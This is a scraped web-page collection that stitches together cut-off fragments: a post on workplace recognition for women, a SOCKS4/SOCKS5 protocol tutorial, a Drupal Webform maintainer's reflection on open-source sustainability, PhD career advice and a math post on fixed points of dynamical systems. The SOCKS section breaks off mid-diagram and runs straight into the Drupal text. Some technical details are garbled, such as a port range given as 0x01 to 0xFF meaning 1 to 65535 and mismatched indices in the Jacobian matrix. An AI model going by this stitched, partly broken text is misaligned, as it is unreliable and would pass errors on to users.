driven by my own internal desires to do well, to be good, and to be of service to others. However, I realised the effects of recognition on my career when I wasn’t being recognised. Yes, I was still as driven as before, but I was starting to doubt if my work was making any impact anymore. As a result, I started looking elsewhere for a place where my work would be valued.</p><p id="9450"><em>Question: Does your company have an inclusive recognition system that is well thought of?</em></p></div></div></section><section><div><div><figure><div role="button" tabindex="0"><div><div><p><img alt="People joining hands" src="https://miro.medium.com/max/10368/0*Qjrojqrv9Y_zTOZI" width="5184" height="3456" srcset="https://miro.medium.com/max/552/0*Qjrojqrv9Y_zTOZI 276w, https://miro.medium.com/max/1104/0*Qjrojqrv9Y_zTOZI 552w, https://miro.medium.com/max/1280/0*Qjrojqrv9Y_zTOZI 640w, https://miro.medium.com/max/1400/0*Qjrojqrv9Y_zTOZI 700w" sizes="700px" data-old-src="https://miro.medium.com/max/60/0*Qjrojqrv9Y_zTOZI?q=20"></p></div></div></div><figcaption>Photo by <a href="https://unsplash.com/@timmarshall?utm_source=medium&amp;utm_medium=referral" rel="noopener">Tim Marshall</a> on <a href="https://unsplash.com/?utm_source=medium&amp;utm_medium=referral" rel="noopener">Unsplash</a>.</figcaption></figure><blockquote><p id="d331">“The women we spoke to took great pleasure in the quality of their work, whether that meant pride in the elegance and clarity of a piece of research or reorganising an administrative system in a way that actively contributed to the effectiveness of a department.” — <a href="https://www.cam.ac.uk/women-at-cambridge/chapters-and-themes/chapter-1-the-achievements-that-matter-most-and-why" rel="noopener">University of Cambridge</a></p></blockquote><p id="c44c">Women take great pride in their work.

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article>
				<p>
	Yesterday I was verifying that the SOCKS test suite of 
	 <a href="https://github.com/tholian-network/stealth">Tholian Stealth</a> 
	is working and I realized that writing failsafe tests are not
	as easy as someone might think. So here's my write-up about
	the SOCKS protocol.
</p>
<p>
	The problem with SOCKS in a nutshell is that it is not as well
	documented as someone might think.
</p>
<p>
	Most people are even unaware of the role that a SOCKS proxy plays
	in between network connections and therefore don't know what exactly
	a SOCKS proxy can or cannot do in regards to blocking ads and malicious
	domains.
</p>
<p>
	So I thought that a reference-class article for SOCKS4 and SOCKS5
	would be nice, documenting its quirks and common pitfalls while
	implementing those protocols.
</p>
<p>
	For the implementation we're going to build in this article,
	we only need plain node.js and its 
	 <code>net</code>
	 core stack. The
	implementation will be peer-to-peer, which means it can be used
	for both the client-side and server-side whereas both sides are
	implemented in node.js for the sake of simplicity.
</p>
<h2>Introduction</h2>
<p>
	First off, you have to know that the 
	 <code>SOCKS</code>
	 protocol is specified as
	 <a href="https://tools.ietf.org/html/rfc1928">RFC1928</a> 
	 and
	 <a href="https://tools.ietf.org/html/rfc1929">RFC1929</a> 
	 and didn't change since
	 <code>1996</code>
	 so it's somewhat safe to assume that this is the final version
	of the network protocol.
</p>
<p>
	The SOCKS protocol in general and its role is pretty much what telephone
	operators did in the past. A client connects to the SOCKS proxy and
	requests to connect to a specific target. The proxy tries to connect
	to the target, and if it succeeds reaches through the connection to the
	client.
</p>
<pre>Client: Please let me connect to IP 1.2.3.4.
Proxy:  Trying to connect... please hold the line ...
Proxy:  Here's the connection handle, any further data will be dispatched through automatically.
</pre>
<pre>Client: Please let me connect to IP 1.2.3.4.
Proxy:  Trying to connect... please hold the line ...
Proxy:  Sorry, the given target is not reachable. Please try again later.
Proxy:  *hangs off the phone* Beep Beep Beep.
</pre>
<p>
	As both 
	 <code>SOCKS4</code>
	 and 
	 <code>SOCKS4a</code>
	 were proprietary protocols, they didn't
	have any RFC. 
	 <code>SOCKS5</code>
	 is referring a lot the 
	 <code>SOCKS4</code>
	 protocol and
	its featureset, so reading the RFC is quite complicated if you don't
	know what the older protocol versions actually did feature-wise.
</p>
<p>
	Usually though, most clients and servers that claim to support SOCKS5
	actually only support the 
	 <code>user</code>
	 and 
	 <code>password</code>
	 authentication, not
	the 
	 <code>IPv6</code>
	 or 
	 <code>DNS/UDP</code>
	 related features that come with it.
</p>
<p>
	This implementation will focus mostly on the 
	 <code>IPv4</code>
	 and 
	 <code>IPv6</code>
	differences and will - for the sake of simplicity - only support 
	 <code>TCP</code>
	based connections.
</p>
<p>
	The 
	 <code>SOCKS4</code>
	 featureset
	:
</p>
<ul>
	<li>connects to <code>IPv4</code> (TCP)</li>
</ul>
<p>
	The 
	 <code>SOCKS4a</code>
	 featureset
	:
</p>
<ul>
	<li>connects to <code>IPv4</code> (TCP)</li>
	<li>connects to <code>domain</code> (TCP)</li>
	<li>authentication via <code>user</code> is broken in practice (no password)</li>
</ul>
<p>
	The 
	 <code>SOCKS5</code>
	 featureset
	:
</p>
<ul>
	<li>connects to <code>IPv4</code> (TCP and UDP)</li>
	<li>connects to <code>IPv6</code> (TCP and UDP)</li>
	<li>connects to <code>domain</code> (TCP)</li>
	<li>authentication via <code>user</code> and <code>password</code></li>
</ul>
<h2>SOCKS Protocol and Network States</h2>
<p>
	Describing SOCKS data frames can be kind of complicated, because the
	interpretation of a SOCKS frame is different depending on its network
	state. So I'm trying to document the different network states first,
	so that you know what kind of states on both sides are possible.
</p>
<p>
	We are also going to completely ignore the 
	 <code>SOCKS authentication methods</code>
	,
	because they are broken across every single Browser; and implemented in
	specification violating non-secure non-encrypted manners across every
	piece of source code I've come across.
</p>
<h3>SOCKS Version 4</h3>
<p>
	The SOCKS 
	 <b>Version 4</b>
	 network flow looks like this
	:
</p>
<ul>
	<li>Client sends Connection Request Frame</li>
	<li>Server responds with a Status Frame</li>
</ul>
<p>... and that's pretty much it. Super simple.</p>
<p>
	 <b>SOCKS Version 4 Connection Request Frame</b>
	:
</p>
<pre>+---------+---------+----+----+----+----+----+----+----+----+....+----+
| VERSION | COMMAND | DSTPORT |      DSTIP        | USERID       |NULL|
+---------+---------+----+----+----+----+----+----+----+----+....+----+
     1         1         2              4           variable       1
</pre>
<ul>
	<li><code>VERSION</code> (1 byte) represents the <code>SOCKS version</code> , which can be either of <code>0x04</code> or <code>0x05</code> .</li>
	<li><code>COMMAND</code> (1 byte) represents the <code>SOCKS command</code> , which can be either of the Commands explained below.</li>
	<li><code>DSTPORT</code> (2 bytes) represents the destination port from <code>1</code> to <code>65535</code> .</li>
	<li><code>DSTIP</code> is an <code>IPv4</code> (4 bytes) represents the destination IP, and encodes 4 digits as <code>0x00</code> to <code>0xFF</code> respectively.</li>
	<li><code>USERID</code> (variable byte length, followed by a <code>NULL</code> terminator byte) represents an authentication mechanism for a user-login; but without a password.</li>
</ul>
<p>
	 <b>SOCKS Version 4 Commands</b>
	:
</p>
<ul>
	<li><code>0x01</code> represents <code>CONNECT</code> and is a TCP/IP connection request which lets the Server established the connection.</li>
	<li><code>0x02</code> represents <code>BIND</code> and is a TCP/IP port binding to allow the Client to establish the connection themselves.</li>
</ul>
<p>
	 <b>SOCKS Version 4 Connection Status Frame</b>
	:
</p>
<pre>+---------+--------+----+----+----+----+----+----+
| VERSION | STATUS | DSTPORT |      DSTIP        |
+---------+--------+----+----+----+----+----+----+
     1         1        2              4
</pre>
<ul>
	<li><code>VERSION</code> (1 byte) represents the <code>SOCKS version</code> , which can be either of <code>0x04</code> or <code>0x05</code> .</li>
	<li><code>STATUS</code> (1 byte) represents the <code>SOCKS status</code> , which can be either of the Status explained below.</li>
	<li><code>DSTPORT</code> (2 bytes) represents the destination port from <code>1</code> to <code>65535</code> .</li>
	<li><code>DSTIP</code> is an <code>IPv4</code> (4 bytes) represents the destination IP, and encodes 4 digits as <code>0x00</code> to <code>0xFF</code> respectively.</li>
</ul>
<p>
	 <b>SOCKS Version 4 Status Codes</b>
	:
</p>
<ul>
	<li><code>0x5A</code> Request granted.</li>
	<li><code>0x5B</code> Request rejected or failed.</li>
</ul>
<p>
	 <b>SOCKS Version 4 Status Codes for Authentication Mechanism</b>
	:
</p>
<p>(I would not recommend to implement them)</p>
<ul>
	<li><code>0x5C</code> Request failed because Client's <code>identd</code> is not reachable from server.</li>
	<li><code>0x5D</code> Request failed because Client's <code>identd</code> could not confirm the User ID.</li>
</ul>
<h3>SOCKS Version 5</h3>
<p>
	 <b>Important</b>
	:
	 The SOCKS Version 5 protocol is different in
	its network flow and data frame structure; and it has a
	reserved byte with a 
	 <code>0x00</code>
	 value where the SOCKS Version 4
	protocol would otherwise expect a non-NULL byte data.
</p>
<p>
	Additionally, the order of 
	 <code>Destination Port</code>
	 and 
	 <code>Destination Address</code>
	is different from the order specified in SOCKS Version 4.
</p>
<p>
	The SOCKS 
	 <b>Version 5</b>
	 network flow looks like this
	:
</p>
<ol>
	<li>Client and Server authenticate via handshake mechanism.</li>
	<li>Server authenticates or responds with error message.</li>
	<li>Client requests to connect or bind to an IPv4, IPv6 or domain.</li>
	<li>Server responds with connection status.</li>
</ol>
<p>
	 <b>SOCKS Version 5 Handshake Request Frame</b>
	:
</p>
<pre>+---------+----+----+----+....+
| VERSION | NMETHODS| METHODS |
+---------+----+----+----+....+
     1         2      variable
</pre>
<p>
	 <b>SOCKS Version 5 Handshake Response Frame</b>
	:
</p>
<pre>+---------+----+----+
| VERSION | METHOD  |
+---------+----+----+
     1         1
</pre>
<ul>
	<li><code>VERSION</code> (1 byte) represents the <code>SOCKS version</code> , which is <code>0x05</code> .</li>
	<li><code>NMETHODS</code> (1 byte) represents the byte length of the following encoded <code>METHOD</code> s.</li>
	<li><code>METHODS</code> (variable byte length) represents the encoded SOCKS methods.</li>
</ul>
<p>
	 <b>SOCKS Version 5 Handshake Methods</b>
	:
</p>
<ul>
	<li><code>0x00</code> represents No Authentication required.</li>
	<li><code>0x01</code> represents <code>GSSAPI</code> which is a "secure" context as defined per <a href="https://tools.ietf.org/html/rfc1961">RFC1961</a> .</li>
	<li><code>0x02</code> represents <code>username/password</code> plaintext authentication.</li>
	<li><code>0x80</code> to <code>0xFE</code> are reserved for private methods, but are never used in practice.</li>
	<li><code>0xFF</code> represents No Acceptable methods (in a response).</li>
</ul>
<p>
	 <b>SOCKS Version 5 Connection Request</b>
	:
</p>
<p>
	After the Client and Server have negotiated an Authentication Method,
	the Client sends a Connection Request Frame to the Server.
</p>
<pre>+---------+---------+-----+------+----+----+----+----+
| VERSION | COMMAND | RSV | ATYP | DSTADDR | DSTPORT |
+---------+---------+-----+------+----+----+----+----+
     1         1       1      1    variable     2
</pre>
<ul>
	<li><code>VERSION</code> (1 byte) represents the <code>SOCKS version</code> , which is <code>0x05</code> .</li>
	<li><code>COMMAND</code> (1 byte) represents either of the Commands explained below.</li>
	<li><code>RSV</code> (1 byte) represents the reserved byte which has to be <code>0x00</code> (to be able to differ it from a SOCKS Version 4 Connection Request).</li>
	<li><code>ATYP</code> (1 byte) represents the address type, which can be either of <code>0x01</code> (IPv4 address), <code>0x03</code> (domain name), <code>0x04</code> (IPv6 address).</li>
	<li><code>DSTADDR</code> (variable) represents the destination address as an IPv4 (in 4 octets), the domain name (with a prefixed byte length), or an IPv6 (in 16 octets).</li>
	<li><code>DSTPORT</code> (2 bytes) represents the destination port from <code>0x01</code> ( <code>1</code> ) to <code>0xFF</code> ( <code>65535</code> ).</li>
</ul>
<p>
	 <b>SOCKS Version 5 Commands</b>
	:
</p>
<ul>
	<li><code>0x01</code> represents <code>CONNECT</code> and is a TCP/IP connection request which lets the Server established the connection and forward further packets.</li>
	<li><code>0x02</code> represents <code>BIND</code> and is a TCP/IP port binding to allow the Client to establish the connection themselves.</li>
	<li><code>0x03</code> represents <code>UDP ASSOCIATE</code> and is a UDP associate request which lets the Server establish the connection and forward further packets.</li>
</ul>
<p>
	 <b>SOCKS Version 5 Connection Status Frame</b>
	:
</p>
<p>
	After the Client has sent the Connection Request frame, the Server responds
	with a Connection Status Frame.
</p>
<pre>+---------+-------+-----+------+----+----+----+----+
| VERSION | REPLY | RSV | ATYP | BNDADDR | BNDPORT |
+---------+-------+-----+------+----+----+----+----+

If the Webform module is unsupported, the Drupal community and organizations that need to create forms and collect submissions could suffer.</p></div></div></div></div></div><div><div><div><div><div><div><div><p><em>So, maybe it’s not okay when individuals and organizations leave the Drupal community and leave behind projects that are not maintained.</em></p></div></div></div></div></div></div></div><div><div><div><div><div><p>Generally, when people and organizations leave the Drupal community, they don't talk about it. Occasionally, there are snarky discussions involving assumptions on Reddit. As for me, I’m using my blog as a platform to have this discussion.</p></div></div></div></div></div><div><div><div><div><div><div><div><p><em>When someone stops contributing to an Open Source project, there are no exit interviews. This blog may serve as a forum at which I can conduct my exit interview.</em></p></div></div></div></div></div></div></div><div><div><div><div><div><p>Before considering what my exit interview might entail, it would help to define my role and responsibility as the Webform module's maintainer in the Drupal community.</p></div></div></div></div></div><div><div><div><div><div><div><div><p><em>The role of maintaining the Webform module came with a lot of responsibility.</em></p></div></div></div></div></div></div></div><div><div><div><div><div><p>Writing and talking about the project has proved to be my best way to ensure that people are comfortable with the Webform module. Prior to maintaining the Webform module, I never talked or wrote about my code. Deciding to face my lifelong battle with stage fright when it comes to public speaking, I managed to <a href="https://docs.google.com/document/d/1Pek4ik8Oor4uuhkuz54i8sURKQzADXxxy3Vrw8a_DZA/edit">present at dozens of meetups, camps, and conferences</a>. My engagement with different people in the Drupal community inspired me to take on other challenges, including <a href="https://www.jrockowitz.com/blog/caring-about-accessibility">caring about the accessibility</a> and the <a href="https://www.jrockowitz.com/blog/caring-about-accessibility">sustainability of the Webform module</a>. With each encounter/exchange, I gained confidence and received invaluable feedback, which in turn led to a greater understanding of what I needed to do and what our community needed from me</p></div></div></div></div></div><div><div><div><div><div><p>In the Drupal community, making sure our code is secure is an ongoing challenge, with many discussions only made publicly available as a <a href="https://www.drupal.org/security">Drupal security advisory</a> (SA). I found addressing security issues for just one module very challenging and an essential part of my role as a project maintainer. I tip my hat to <a href="https://www.drupal.org/drupal-security-team">Drupal's security team</a> for the ongoing work ensuring all our websites and applications are safe. Even if I have no "free" time available to maintain the Webform module, I will always feel obligated to address security issues.</p></div></div></div></div></div><div><div><div><div><div><p>Over the past five years, I have started using the phrase "free" time to explain why I can't help people solve a particular issue around custom code or custom project requirements. I say, "Sorry, but I don't have the 'free' time to help you."</p></div></div></div></div></div><div><div><div><div><div><div><div><p><em>My lack of "free" time led me to think and talk about the sustainability of my contribution to the Webform module and Drupal.</em></p></div></div></div></div></div></div></div><div><div><div><div><div><div><div><p><em>My "free" contribution was never going to be sustainable.</em></p></div></div></div></div></div></div></div><div><div><div><div><div><p>While contributing to an open-source project in my "free" time means I am not compensated for my contribution, the upside is I get to decide what I contribute and the quality of my contribution. Simply put, the Webform module is the highest quality code I have written in my career because I set the project's coding standard and timeline. I put five years of sweat equity into the project. Gradually I came to realize that my unpaid commitments and efforts are not sustainable. In an effort to circumvent this inevitable conclusion, I’ve experimented with <a href="https://www.jrockowitz.com/blog/sponsor-a-feature">sponsored features</a> and paid support and even set up an <a href="https://www.jrockowitz.com/blog/webform-joins-open-collective">Open Collective</a>. Thus far (and this could change), I am a passionate programmer and not a business owner or a salesperson. The latter makes great software, and the former figures out how to make money from the great software. As an individual developer, I’ve yet to see how to make my contribution sustainable.</p></div></div></div></div></div><div><div><div><div><div><div><div><div><p><em>The larger question remains not just for me individually but for us as a community: How do we make our contributions sustainable, and in turn, our software stable? </em></p><p><em>It’s a question that can’t remain unanswered for much longer.</em></p></div></div></div></div></div></div></div></div><div><div><div><div><div><p>Sustainability means that our code and community is stable and maintainable. When someone leaves the community, we have to ask the question, "How can the Drupal community maintain that individual's or organization's contribution?". Keep in mind contributions come in all shapes and sizes, and it is not always code-based. For example, individuals and organizations organize and sponsor events. If they leave, can the event go on without them?</p></div></div></div></div></div><div><div><div><div><div><div><div><p><em>Can the Webform module live on without me? The answer is yes and no.</em></p></div></div></div></div></div></div></div><div><div><div><div><div><p>The most immediate reason I say “yes” is because the Webform module has a lot of test coverage, which ensures stability as the code evolves. I also have to say “no” because the Webform module is a massive codebase, which could become hard to maintain.</p></div></div></div></div></div><div><div><div><div><div><p>It is difficult to admit, but the Webform module's feature richness has created a maintainability challenge. I did not architect most form and submission features, including submission limits, using Drupal's modular plugin system. I did use Drupal's plugin system for several key aspects of the Webform module. For example, webform elements are entirely plugin-based, resulting in relatively well-encapsulated code that is easy to tweak, test, and maintain.</p></div></div></div></div></div><div><div><div><div><div><p>At some point, I missed the opportunity to refactor most of the Webform features into plugins. Every feature has test coverage, making it easier to refactor the code, but I don't have the "free" time to do this work. Code refactoring is not something most organizations and clients can justify sponsoring.</p></div></div></div></div></div><div><div><div><div><div><p>My leaving the Drupal community could create a big hiccup due to the size of my contribution and the fact that Webform is one of Drupal's most installed modules. Reviewing my situation, I’ve realized that we should think more about the maintainability of our top 50 - 100 contrib modules and themes. We may need to change the norm that one or, luckily, two developers actively maintain a contributed module. Like the Webform module, a few popular modules serve a particular business requirement for websites that install them. If these modules were not maintained, these websites would not be able to meet their business requirements.</p></div></div></div></div></div><div><div><div><div><div><div><div><p><em>We continually need to make it easier for people and organizations to join and leave our community while ensuring that our software is stable, maintainable, sustainable, and improvable.</em></p></div></div></div></div></div></div></div><div><div><div><div><div><p>"Improvability" is not a term often used in software and community. It encompasses the traits needed to be stable, maintainable, sustainable, and improvable. If we can improve our process and software when individuals and organizations leave the community, we will continue to grow and be successful.</p></div></div></div></div></div><div><div><div><div><div><div><div><p><em>So maybe this blog post won’t turn out to be the beginning of an exit interview.</em></p></div></div></div></div></div></div></div><div><div><div><div><div><p>The fact that I am writing this blog post means I am conflicted on what to do. The fact that you are reading this blog post shows that we all collectively care about our community. I’m putting it here because it’s where I always come to ask questions, reflect, learn and listen - it’s been my forum for my entire Drupal journey. It’s my Drupal community. It’s your Drupal community. It’s our Drupal community.</p></div></div></div></div></div><div><div><div><div><div><p>I wish we could have these discussions in-person at DrupalCon. I'm comfortable enough to talk about them here, and I hope to have them face-to-face sometime soon. Professionally, something has to change for me. Being a Drupal community member, I know we are continuing to change and improve how we collaborate; together, we will grow from this experience.</p></div></div></div></div></div><div><div><div><div><div><p>Once again, thank you for listening. As always, I look forward and hope to hear from you.</p></div></div></div></div></div></div></div></div><div id="blog-subscribe-success-dialog"><div><p>Almost done…</p><p>We just sent you an email.<!-- -->&nbsp;<strong>Please click the link in the email to confirm your subscription!</strong></p><p><a>OK</a></p></div></div></div></div>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
        <li>
          <p><strong>Know your audience.</strong> Don’t explain your work to anyone “like they  are a four-year old”, unless you are actually dealing with a four-year old.  Most people you need to explain your work to are smart, but most are not  experts in your field. Apply this to all forms of communication but especially to  oral presentations and funding applications.</p>
        </li>
        <li>
          <p><strong>Always explain your choices.</strong> <em>Why</em> is this your research question, your case study, your method, your theoretical  framework, your line of argument, your conclusion? Every step needs to be  explained. If people ask irrelevant questions, it is often because you have not  explained your choices well.</p>
        </li>
        <li>
          <p><strong>Learn to develop an argument and defend it.</strong> Find your voice, in speaking and in writing. Learn  how to make your work relevant. This is not simply about societal relevance  (although it could be). This is also about being able to explain why someone should  be interested in your work. This implies you need to learn how to write and  speak. There are many books and websites that teach these skills, but remember:  you need to find <em>your</em> voice.</p>
        </li>
        <li>
          <p><strong>Teaching matters more than people say.</strong> “All that matters are publications!” Wrong.  Yes, publications are increasingly important and they do help in getting  funding or landing a job, but if you apply for a position that is at least in  part a teaching position, you also need to demonstrate you like to teach and  are able to do so. A good publication record may get you shortlisted, but  having two more papers than another candidate will rarely land you the job. A  documented willingness and ability to teach will. Don’t be afraid to start  writing a syllabus for a course you may one day teach. Think about literature,  but also about didactical approaches.</p>
        </li>
        <li>
          <p><strong>References are not an afterthought.</strong> References are an integral part of any piece  of academic writing. They are not an appendix and should be treated as central  to your argument. They should already be added to any draft you share. Generally  speaking, treat drafts that you share with others with some respect. A draft is  not supposed to be perfect but the least you can do is run a spelling check.</p>
        </li>
        <li>
          <p><strong>There are three types of comments that require  two types of responses.</strong> First,  there are comments that are correct or relevant and need to be addressed. This  is the simple part. Second, there are comments you do not agree with. Defend  your argument, not only in person but also in writing. Third, there are  comments that you consider less relevant, too detailed or even trivial or petty.  They also need to be addressed. What may seem trivial to you, may be quite  important to someone else. Even if this is less relevant to them as well, this  is not an excuse for not addressing it.</p>
        </li>
        <li>
          <p><strong>Prepare but do not  over-prepare for presentations</strong>. Do not memorize every line of your presentation. Do not read out  a paper or parts of it. A so-called “paper presentation” should never be a  reading of a paper. Always bring at least one printout of your presentation—you  may need it. You can add notes to the printout: key sentences and thank-yous  for example. Do not look at the wall where your slides are projected; look at  your audience and at the computer screen or your printout instead. It is easier  to switch between computer/print-out and audience, as they are both in front of  you. Break this rule when you want to point at something on the screen. Always  bring a pen. Write down keywords from questions (and who asked them, e.g.  “Mike” or “blond&nbsp;♂”) as well as  suggestions.</p>
        </li>
        <li>
          <p><strong>Dare to be different.</strong> But don’t be different just for the sake of  it. Dare to challenge whatever today’s academic fashion is. Don’t use the <em>mot du jour</em> unless you can’t get around  it. Avoid what George Orwell calls “Pretentious diction” but be playful as  well. What looks cool today will look outdated tomorrow. Don’t discard the old  for the new, unless you have studied the old and can really say the new is  better. Don’t carbon copy someone else’s critique of a theory or idea. Many  critiques are based on selective reading or are simply straw-man arguments.</p>
        </li>
        <li>
          <p><strong>Check the facts. </strong>Don’t simply repeat things that others have  told you. Check the source and then find another source. I am not just talking  about academic writing here. Academic life is full of all kinds of stories  about individuals, departments, journals, reward systems, selection procedures  and so on. Be aware that many of these stories are incorrect. Don’t base your  assessment of anyone or anything on stories that cannot be taken at face value.</p>
        </li>
        <li>
          <p><strong>Apologies first, excuses second.</strong> If you cannot meet a mutually agreed deadline  or meeting, apologize, no matter what the reason is. “I’m sorry I didn’t send  in the paper in time; my child fell ill and I couldn’t focus on work” is an  accepted apology/excuse. Moreover, whenever possible, apologize before missing  a deadline or meeting. For example: “I’m sorry I won’t be able to attend the  meeting because…”</p>
        </li>
        <li>
          <p><strong>Be generous. </strong>If you’re not sure if you should thank someone,  you should. I have looked at published papers and thought: “Wow, I briefly  discussed this paper with her and she even put me in the acknowledgements—how  kind!” But I’ve also had the opposite response: “I’ve spent half a day reading  this paper and discussing this with the author. Let’s see how she mentions me  in the acknowledgements… What? She doesn’t?!” </p>
        </li>
        <li>
          <p><strong>Promote your own work as  well as that of others.</strong> MPG on this issue: <em>“it’s great to  circulate news about your own work, but make sure you’re promoting and sharing  the work of friends and colleagues too. Practice intellectual and professional  generosity as part of your participation in the broader community.”</em> Also  alert people about new papers, calls for papers and lecture announcements that  you happen to see. Forwarding an e-mail doesn’t take too long.</p>
        </li>
        <li> 
          <p><strong>Be a good colleague, inside your department and  outside of it</strong>. Say  yes when people ask you to comment on their work. It means they value your  opinion. Review a paper when you’re asked to do so. Don’t reply that you’ve  already reviewed three papers this year. Think about how many reviewers it  takes for one paper to be published in a journal. Three? Think again. Many  papers are rejected but they also need to be reviewed. Moreover, many papers  are reviewed twice before they are accepted for publication.      </p>
        </li>
        <li>
          <p><strong>Doing a PhD is not a  regular job, but things need</strong><strong> to get done and sometimes you are asked to do  things that may not be your priority.</strong> This is part of life. A high-quality  dissertation is a necessary but by itself an insufficient condition for  entering academia. Besides teaching (see #4) you need to be a swift  communicator. MPG  on this: <em>“Learn how to say ‘no’ politely  and firmly. And do so often. But also learn how to say ‘yes.’ Learn how to  recognize when someone has gone the extra mile to extend an invitation to you,  to introduce you to someone, and say ‘yes’ as a sign of respect.” </em>Furthermore,  some e-mails require a rapid  response, doodles to plan meetings for example. Don’t delay requests for admin  details from your supervisor, department secretary or chair. Most likely, they  need to collect it for someone else. Don’t complain about admin and the like too  much. Typically, your supervisor, the graduate school director or to the admin  staff don’t make the rules. But: learn when to say yes or no. </p>
        </li>
        <li>
          <p><strong>Update your planning regularly.</strong> It helps you to keep track of how things are  going. It also helps your supervisor. Your planning for the next month should  be as detailed as possible. Include many tasks. This helps to set targets. Set  big targets and set small targets. The best planning includes many small  targets. This allows you to focus on concrete tasks—and finish them. It also  feels good to cross things of a list.</p>
        </li>
        <li>
          <p> <strong>Sleep on it.</strong> Comments typically appear harsh when you first  read or hear them. You may need to respond to oral comments directly, but you  do not always have to do so. You can always take some time to respond to  written comments. In my experience, comments seem a lot more reasonable when  you re-read them after 24 hours. Don’t be aggressive in your response. Most  likely, people have put time and energy in providing comments on your work,  even if they may have phrased them rather negatively. Also consider that you  may have annoyed your reader without intending to do so. Academics often review  their colleagues’ work after office hours. So whether their comments were  constructive or not and whether they had a good day or not: they have made an  effort. More generally speaking, if you don’t get enough sleep, it is hard to  focus. Sometimes an hour of additional sleep may result is a shorter, but more  productive day of work.</p>
        </li>
        <li>
          <p><strong>Reference letters.</strong> MPG one more time: “<em>Never ask for a letter of recommendation  without giving at least two week’s notice, a fresh copy of your CV, and  whatever is being proposed. Accept responsibility for bugging your writer about  the due dates and details.”</em></p>
        </li>
        <li>          
          <p><strong>Layout matters.</strong> Think about your readers. Think about changing  the default font. Add your name. Add page numbers. People have their own  preferences. If you regularly send something to someone, ask them about what  they find pleasurable to read. Personally, I prefer Arial 12, single-lined and 1  inch or 2.5cm margins on all sides. This allows me to print two pages of one  sheet of paper (and two on the flip side), thereby minimizing the number of  …</p></li></div></div>

In this post, I will discuss fixed points for a general case of a continuous-time $n$-dimensional system.</p><h4 id="fixed-point">Fixed point</h4><p>Just to reiterate, if the ordinary differential equation (ODE) in $\eqref{eq:1}$ represents a dynamical system:</p>\[\dot x = f(x) \label{eq:1}\]<p>Fixed points of this system are given by the roots of the equation $\eqref{eq:2}$:</p>\[\begin{equation} \dot x = f(x) = 0 \label{eq:2} \end{equation}\]<h2 id="fixed-points-of-multi-dimensional-system">Fixed points of Multi-dimensional system</h2><p>My <a href="https://adipandas.github.io/posts/2020/02/stable-unstable-fixed-point/">previous post</a> only explained the definition of fixed point and provided an example with a scalar-valued dynamical system. Now, lets discuss a case of multi-dimensional ODE.</p><p>We will start with the system given by equation $\eqref{eq:3}$:</p>\[\mathbf{\dot x} = \mathbf{f(x)} \label{eq:3}\]<p>where $\mathbf{f}$ is a vector-valued function, $\mathbf{x}$ and $\mathbf{\dot x}$ are $n$-dimensional vectors:</p>\[\mathbf{x, \dot x} \in \mathcal{R}^{n} \label{eq:4}\]<p>We find the fixed points (a.k.a. equilibrium states) of the system by following $\eqref{eq:2}$:</p>\[\mathbf{\dot x_{eq}} = \mathbf{f}(\mathbf{x_{eq}}) = \mathbf{0} \label{eq:5}\]<p>The roots of $\eqref{eq:5}$ will give us the value of $\mathbf{x_{eq}}$, i.e., fixed points of our multi-dimensional system.</p><h2 id="stable-and-unstable-fixed-points">Stable and Unstable Fixed Points</h2><p>We analyzed the system in a one-dimensional case (<a href="https://adipandas.github.io/posts/2020/02/stable-unstable-fixed-point/">here</a>) using a small perturbation $\delta$ at the equilibrium condition of the system. We will follow the similar procedure here as well.</p><p>We evaluated $\mathbf{f}^{\prime}\mathbf{(x)}$ at $\mathbf{x_{eq}}$ to see if our fixed point is stable or unstable. In case of one-dimensional system, it was easy since $f^{\prime}(x_{eq})&gt;0$ is unstable fixed point $x_{eq}$ while it is stable when $f^{\prime}(x_{eq})&lt;0$. In case of high-dimensional system, we cannot do this.</p><p>To analyze the behavior of our $n$-dimensional system at $\mathbf{x_{eq}}$, we will introduce the perturbation $\mathbf{\delta x}$ at $\mathbf{x_{eq}}$. Thus, we end up with the following:</p>\[\begin{align} \mathbf{\dot x_{eq} + \dot {\delta x}} &amp;= \mathbf{f(x_{eq}+\delta x)} \label{eq:6} \end{align}\]<p>Using Taylor expansion on $\eqref{eq:6}$:</p>\[\begin{align} \mathbf{\dot x_{eq} + \delta \dot x = f(x_{eq}) + f^{\prime}(x_{eq}) \delta x + f^{\prime \prime}(x_{eq}) \frac{\delta x^2}{2!} + \dots} \label{eq:7} \end{align}\]<p>But, we know at fixed points, equation $\eqref{eq:5}$ holds and thus, $\eqref{eq:7}$ reduces to $\eqref{eq:8}$.</p>\[\begin{align} \mathbf{ \delta \dot x = f^{\prime}(x_{eq}) \delta x + f^{\prime\prime}(x_{eq}) \frac{\delta x^2}{2!} + \dots} \end{align}\] \[\mathbf{ \delta \dot x = f^{\prime}(x_{eq}) \delta x + H.O.T. \label{eq:8}}\]<p>We can ignore the higher order terms $\mathbf{H.O.T.}$ for values of $\mathbf{\delta{x}}$ close to $\mathbf{0}$, resulting in equation $\eqref{eq:9}$.</p>\[\begin{align} \mathbf{\delta \dot x = f^{\prime}(x_{eq}) \delta x \label{eq:9}} \end{align}\]<p>$\mathbf{f}^{\prime}\mathbf{(x)}$ is the Jacobian of $\mathbf{f(x)}$ at $\mathbf{x_{eq}}$, i.e., a <strong>linear approximation</strong> of our dynamical system $\mathbf{f(x)}$ near $\mathbf{x_{eq}}$ (you can refer <a href="https://adipandas.github.io/posts/2020/03/vector-calculus/#jacobian-aka-derivative-of-vector-valued-function">this</a> for further details on Jacobian).</p>\[\begin{align} \mathbf{f}^{\prime}\mathbf{(x)} &amp;= \left[ \frac{\partial\mathbf{f}}{\partial x_{1}}, \frac{\partial\mathbf{f}}{\partial x_{2}}, \dots, \frac{\partial\mathbf{f}}{\partial x_{n}} \right] \label{eq:11}\\ \mathbf{f}^{\prime}\mathbf{(x)} &amp;= \begin{bmatrix} \frac{\partial{f_{1}}}{\partial x_{1}} &amp; \frac{\partial{f_{2}}}{\partial x_{2}} &amp; \dots &amp; \frac{\partial{f_{n}}}{\partial x_{n}}\\ \vdots &amp; \ddots &amp; \ddots &amp; \vdots \\ \frac{\partial{f_{n}}}{\partial x_{1}} &amp; \frac{\partial{f_{n}}}{\partial x_{2}} &amp; \dots &amp; \frac{\partial{f_{n}}}{\partial x_{n}}\\ \end{bmatrix} \label{eq:12} \end{align}\]<p>Using this Jacobian, equation $\eqref{eq:12}$, at our fixed point $\mathbf{x_{eq}}$ for the dynamical system under consideration, we can calculate its <a 